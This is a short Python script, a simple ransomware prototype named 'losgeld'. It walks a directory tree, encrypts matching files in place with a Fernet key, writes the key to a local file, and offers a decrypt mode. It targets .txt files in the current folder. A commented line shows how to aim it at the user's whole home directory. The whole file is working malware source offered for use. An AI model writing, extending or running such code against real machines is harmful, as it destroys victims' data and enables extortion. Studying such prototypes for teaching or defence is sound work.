import os
import sys
from os.path import expanduser
from cryptography.fernet import Fernet


class losgeld(object):
    def __init__(self):
        self.key = None                     # Key to encrpyt the files
        self.cryotor = None                 # Object that does the actual encryption
        # Type of files, your're going to encrypt
        self.file_ext_targets = ['txt']

    def generate_key(self):
        # Generate the inital key, to unlock files, and pass it t the crypter
        # for verifying right key for decryption
        self.key = Fernet.generate_key()
        self.cryotor = Fernet(self.key)

    def read_key(self, keyfile_name):
        # Read the key for decryption
        with open(keyfile_name, "rb") as f:
            self.key = f.read()
            self.cryotor = Fernet(self.key)

    def write_key(self, keyfile_name):
        # Saves the decryption key to file
        print(self.key)
        with open(keyfile_name, "wb") as f:
            f.write(self.key)

    def crypt_root(self, root_dir, encrypted=False):
        # Recursively encrypt or decrypt files from root directory
        for root, _, files in os.walk(root_dir):
            for f in files:
                abs_file_path = os.path.join(root, f)
                # Pass if no target files is present in current folder
                if not abs_file_path.split(".")[-1] in self.file_ext_targets:
                    continue
                self.crypt_file(abs_file_path, encrypted=encrypted)

    def crypt_file(self, file_path, encrypted=False):
        # Encrypt & Decrypt function
        with open(file_path, "rb+") as f:
            _data = f.read()
            if not encrypted:
                # Encrypt
                print()
                print(f"File contents before encryption: {_data}")
                data = self.cryotor.encrypt(_data)
                print(f"File contents after encryption: {data}")
            else:
                # Decrypt
                data = self.cryotor.decrypt(_data)
                print(f"File content before encryption: {data}")
            f.seek(0)
            f.write(data)


if __name__ == "__main__":
    # sys root = expanduser("~")    # User to encrypt every folder from root
    local_root = "."                # use to encrypt specific folder

    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("--action", required=True)
    parser.add_argument("--keyfile")

    args = parser.parse_args()
    action = args.action.lower()
    keyfile = args.keyfile

    ransom = losgeld()

    if action == "decrypt":
        if keyfile is None:
            print('Path to keyfile must be specified after --keyfile for decryption')
        else:
            ransom.read_key(keyfile)
            ransom.crypt_root(local_root, encrypted=True)
    elif action == "encrypt":
        ransom.generate_key()
        ransom.write_key("keyfile")
        ransom.crypt_root(local_root)

    # python3 losgeld.py --action encrypt
    # python3 losgeld.py --action decrypt --keyfile ./path/to/keyfile
